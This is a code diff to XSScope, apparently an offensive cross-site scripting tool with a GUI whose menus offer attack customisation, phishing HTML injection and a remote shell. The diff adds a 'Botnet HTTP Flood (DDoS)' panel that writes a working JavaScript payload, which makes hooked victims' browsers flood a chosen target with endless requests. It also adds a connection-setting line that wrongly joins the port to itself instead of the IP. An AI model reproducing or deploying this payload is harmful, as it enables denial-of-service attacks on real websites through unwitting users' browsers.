@@ -57,7 +57,7 @@ def about():
 # customise + design of GUI
 def agent_module():
     root1 = tk.Toplevel()
-    root1.title("XSScope v2.1 - Customise your attack")
+    root1.title("XSScope v2.2 - Customise your attack")
     root1.geometry('1045x360')
     # root1.iconbitmap('x_logo_VYw_icon.ico')
     root1.resizable(0, 0)
@@ -584,7 +584,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.2.1 - All XSS Payloads")
+    root3.title("XSScope v.2.2 - All XSS Payloads")
     root3.geometry('750x625')
     # root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -813,7 +813,7 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.2.1 - Inject HTML Code")
+    root4.title("XSScope v.2.2 - Inject HTML Code")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
@@ -1044,7 +1044,7 @@ def phishing_website():
 
 def reverse_shell():
     root6 = tk.Tk()
-    root6.title("XSScope v.2.1 - Remote Shell")
+    root6.title("XSScope v.2.2 - Remote Shell")
     root6.geometry('580x70')
     root6.resizable(0, 0)
 
@@ -1063,11 +1063,138 @@ def reverse_shell():
     execute_command = tk.Button(shell_frame, text="Execute", command=exec_js)
     execute_command.grid(row=0, column=1)
 
+    root6.mainloop()
+
+def http_flood():
+    root7 = tk.Toplevel()
+    root7.title("XSScope v.2.2 - Botnet HTTP Flood (DDoS)")
+    root7.geometry('530x135')
+    root7.resizable(0, 0)
+
+    def help_ddos_wiki():
+        webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki/Possible-attacks#usage-5---perform-a-ddos-attack", new=1)
+
+    def launch_ddos():
+        threads_num = str(http_flood_thread.get())
+        print (https_var.get())
+        if "http://" in http_target_entry.get() or "https://" in http_target_entry.get() or " " in http_target_entry.get():
+            tkinter.messagebox.showerror("Invalid URL Format","The URL you entered is invalid format, don't include http:// protocol \n[Correct format: website.com]")
+            return
+        if http_target_entry.get() == "":
+            tkinter.messagebox.showerror("Error","Please specify an URL")
+            return
+        if https_var.get() == 1:
+            https_protocol = "https://"
+        if https_var.get() == 0:
+            https_protocol = "http://"
+
+        xss_ddos_code = """
+
+var target = '""" + str(http_target_entry.get()) + """';
+var thread_count = """ + threads_num + """;
+var scan_counter = 0;
+var resp_size_counter = 0;
+var Sys = {};
+var ua = navigator.userAgent.toLowerCase();
+var s;
+(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
+var xhr; 
+if (!Sys.ie){
+  var i = 0;
+  while(i<thread_count){
+    while_loop_cor();
+    i++;
+  }
+}else{
+  var i = 0;
+  while(i<thread_count){
+    while_loop_ie();i++;
+  }
+}
+if (!Sys.ie){
+  xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = processResp;
+}else{
+  xdr = new XDomainRequest();
+  xdr.timeout = 1000;
+}
+
+function while_loop_cor(){
+  try{
+    ws = new WebSocket('ws://' + target);
+    scan_counter = scan_counter+1;
+    xhr = new XMLHttpRequest();
+    var furl='""" + https_protocol + """' + target + '&xsscope_ddos=' + Math.floor(Math.random()*10000000000);
+    xhr.open('GET', furl);
+    xhr.onreadystatechange = function(){
+      if (xhr.readyState==4){
+        resp_size_counter = resp_size_counter+xhr.responseText.length;
+      }
+    };
+    xhr.onerror = function(e){} 
+    xhr.send(100);
+    setTimeout("while_loop_cor()",0);
+  }
+  catch(err){return;}
+} 
+
+function while_loop_ie(){
+  try{
+    scan_counter = scan_counter+1;
+    xdr = new XDomainRequest();
+    xdr.open('get', '""" + https_protocol + """' + target);
+    xdr.send();
+    setTimeout('while_loop_ie()',0);
+  }catch(err){
+    return;
+  }
+}
+
+function processResp(){
+  if (xmlhttp.readyState==4){}
+}
+        
+"""
+        ddos_file = open("xsscope.js", "w")
+        ddos_file.write(xss_ddos_code)
+        ddos_file.close()
+        tkinter.messagebox.showinfo("Attack launched","Attack is successfully launched")
+
+    http_flood_frame = tk.LabelFrame(root7, text="HTTP Flood (DDoS) Panel")
+    http_flood_frame.place(x=5, y=5)
+
+    http_target_label = tk.Label(http_flood_frame,text="Target URL: ")
+    http_target_label.grid(row=0, column=0)
+
+    http_target_entry = tk.Entry(http_flood_frame,width=40)
+    http_target_entry.grid(row=0, column=1)
+
+    https_var = tk.IntVar()
+    use_https_checkbox = tk.Checkbutton(http_flood_frame,text="Use HTTPS", variable=https_var)
+    use_https_checkbox.grid(row=0, column=2)
+
+    http_thread_label = tk.Label(http_flood_frame, text="Threads: ")
+    http_thread_label.grid(row=1, column=0)
+
+    threads = tk.DoubleVar()
+    http_flood_thread = tk.Scale(http_flood_frame, variable = threads, from_ = 1, to = 100, orient = HORIZONTAL, length=330)
+    http_flood_thread.grid(row=1, column=1)
+
+    button_ddos_frame = tk.LabelFrame(root7, text="")
+    button_ddos_frame.place(x=240, y=95)
+
+    help_ddos = tk.Button(button_ddos_frame, text="Help", command=help_ddos_wiki)
+    help_ddos.grid(row=0, column=0)
+
+    ddos_button = tk.Button(button_ddos_frame, text="Launch Attack", command=launch_ddos)
+    ddos_button.grid(row=0, column=1)
+
+    root7.mainloop()
 
 def main1():
     # setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.2.1")
+    root.title("XSScope v.2.2")
     root.geometry('410x100')
     # root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0, 0)
@@ -1146,6 +1273,7 @@ setInterval('connectLoader()',""" + beacon_interval + """);
     filemenu.add_command(label="Agent Module", command=agent_module)
     filemenu.add_command(label="Inject HTML code", command=phishing_website)
     filemenu.add_command(label="Reverse Shell", command=reverse_shell)
+    filemenu.add_command(label="HTTP Flood (DDoS)", command=http_flood)
     filemenu.add_separator()
     filemenu.add_command(label="Check for update", command=check_update)
     filemenu.add_command(label="Exit", command=quit)
@@ -1263,7 +1391,22 @@ def main():
         elif setup_var.get() == 2:
             tcp_server_ip = str(server_ip_entry.get())
             tcp_server_port = str(server_port_entry.get())
-            tcp_server = tcp_server_ip + ":" + tcp_server_port
+            if tcp_server_ip == "":
+                tkinter.messagebox.showerror("Error","Please enter an URL/IP")
+                return
+            if " " in tcp_server_ip:
+                tkinter.messagebox.showerror("Invalid URL Format", "Please enter a valid URL/IP format")
+                return
+            if tcp_server_port == "":
+                tkinter.messagebox.showerror("Error","Please enter an PORT")
+                return
+            if " " in tcp_server_port:
+                tkinter.messagebox.showerror("Invalid PORT Format", "Please enter a valid PORT format")
+                return
+            if int(tcp_server_port) > 65535:
+                tkinter.messagebox.showerror("Invalid PORT number", "PORT must be a number between 0-65535")
+                return
+            tcp_server = tcp_server_port + ":" + tcp_server_port
             root_main.destroy()
             main1()
 
@@ -1279,10 +1422,8 @@ def main():
     # end of connect gui
     root_main.mainloop()
 
-
 def php_server():
     os.system('php -S localhost:1337 >/dev/null')
-
 
 # starting the threads
 thread_2 = Process(target=php_server)
